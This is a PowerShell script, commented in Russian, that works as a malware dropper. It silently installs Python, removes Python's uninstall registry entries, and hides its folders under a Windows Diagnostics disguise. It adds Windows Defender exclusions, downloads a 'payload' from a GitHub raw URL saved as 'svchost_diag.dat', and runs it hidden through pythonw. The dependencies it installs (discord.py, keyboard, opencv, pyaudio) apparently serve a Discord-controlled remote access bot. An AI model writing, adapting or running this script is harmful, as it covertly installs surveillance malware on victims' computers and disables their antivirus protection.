$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

$logPath = "$env:TEMP\deploy.log"
function Log($msg) { "[$(Get-Date -Format 'HH:mm:ss')] $msg" | Out-File -Append -Encoding utf8 $logPath }

# Запуск процессов без создания консольного окна (Win32 CREATE_NO_WINDOW 0x08000000)
function Run-Silent($exe, $cmdArgs, $wait = $true) {
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $exe
        $psi.Arguments = $cmdArgs
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $proc = [System.Diagnostics.Process]::Start($psi)
        if ($wait -and $proc) {
            $proc.WaitForExit()
        }
        return $proc
    } catch {
        Log "Run-Silent error: $_"
        return $null
    }
}

Log "=== deploy start ==="

$pyPath = "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
$pyw    = "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe"

# Проверка существующего Python в системе
if (-not (Test-Path $pyPath)) {
    $cmdPy = Get-Command python.exe -ErrorAction SilentlyContinue | Where-Object { $_.Source -notlike "*WindowsApps*" } | Select-Object -First 1
    if ($cmdPy) {
        $pyPath = $cmdPy.Source
        $candPyw = Join-Path (Split-Path $pyPath) "pythonw.exe"
        if (Test-Path $candPyw) { $pyw = $candPyw } else { $pyw = $pyPath }
        Log "Found existing system Python: $pyPath"
    }
}

if (-not (Test-Path $pyPath)) {
    Log "Installing Python 3.11..."
    $wc = New-Object Net.WebClient
    $wc.DownloadFile("https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", "$env:TEMP\py_setup.exe")
    Run-Silent "$env:TEMP\py_setup.exe" "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0 AssociateFiles=0 Shortcuts=0" $true
    Remove-Item "$env:TEMP\py_setup.exe" -Force -ErrorAction SilentlyContinue

    $junkFolder = "$env:USERPROFILE\Desktop\параметры"
    if (Test-Path $junkFolder) { Remove-Item $junkFolder -Recurse -Force }

    # Убрать из списка программ
    $ub1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $ub1 -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -like "*Python*" } | Remove-Item -Recurse -Force
    $ub2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $ub2 -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -like "*Python*" } | Remove-Item -Recurse -Force

    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    if (-not (Test-Path $pyPath)) { $pyPath = "python.exe"; $pyw = "pythonw.exe" }
    Log "Python installed: $pyPath"
}

# Гарантируем абсолютный путь к pythonw.exe
if (-not (Test-Path $pyw)) {
    $candPyw = Join-Path (Split-Path $pyPath) "pythonw.exe"
    if (Test-Path $candPyw) { $pyw = $candPyw } else { $pyw = "pythonw.exe" }
}

$deps = @(
    "discord.py", "keyboard", "mouse", "psutil", "pyttsx3",
    "requests", "pywin32", "pycryptodome", "Pillow", "comtypes",
    "pycaw", "opencv-python", "pyaudio", "PyNaCl", "davey"
)
Log "Installing deps..."
Run-Silent $pyPath "-m pip install --upgrade pip -q" $true
Run-Silent $pyPath ("-m pip install " + ($deps -join " ") + " -q") $true
Log "Deps done"

# Скрыть каталог Python
attrib +h +s "$env:LOCALAPPDATA\Programs\Python" | Out-Null

# Постоянная директория вместо TEMP (защита от Storage Sense, очистки временных файлов и Defender)
$workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostics"
if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}
attrib +h +s $workDir | Out-Null

# Исключения Defender (если есть доступ)
Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "pythonw.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "python.exe" -ErrorAction SilentlyContinue

# Скачать payload в постоянную папку
$botPath = "$workDir\svchost_diag.dat"
$repoUrl = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
Log "Downloading payload..."
try {
    $wc2 = New-Object Net.WebClient
    $wc2.DownloadFile($repoUrl, $botPath)
    Log "Payload saved: $botPath"
} catch {
    Log "Download failed, checking local copy..."
}

# Резервная копия
$backupPath = "$env:APPDATA\Microsoft\Windows\svchost_diag.dat"
if (Test-Path $botPath) {
    Copy-Item -Path $botPath -Destination $backupPath -Force -ErrorAction SilentlyContinue
} elseif (Test-Path $backupPath) {
    Copy-Item -Path $backupPath -Destination $botPath -Force -ErrorAction SilentlyContinue
}

# Завершить предыдущий запущенный экземпляр (если был запущен ранее)
Get-CimInstance Win32_Process | Where-Object {
    $_.Name -like "python*.exe" -and ($_.CommandLine -like "*svchost_diag.dat*" -or $_.CommandLine -like "*DOTA*")
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

# Запуск через pythonw.exe без создания консоли
$args = "-W ignore -c `"exec(open(r'$botPath', encoding='utf-8').read())`""
Run-Silent $pyw $args $false
Log "Bot launched via pythonw.exe from $botPath"
Log "=== deploy done ==="
